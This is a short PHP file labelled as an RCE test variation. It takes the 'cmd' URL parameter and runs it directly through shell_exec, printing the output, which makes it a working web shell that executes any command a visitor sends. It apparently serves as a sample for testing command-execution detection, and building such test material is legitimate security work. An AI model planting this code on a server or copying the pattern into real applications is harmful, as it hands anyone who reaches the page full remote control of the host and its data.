<?php
// RCE test variation #223
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>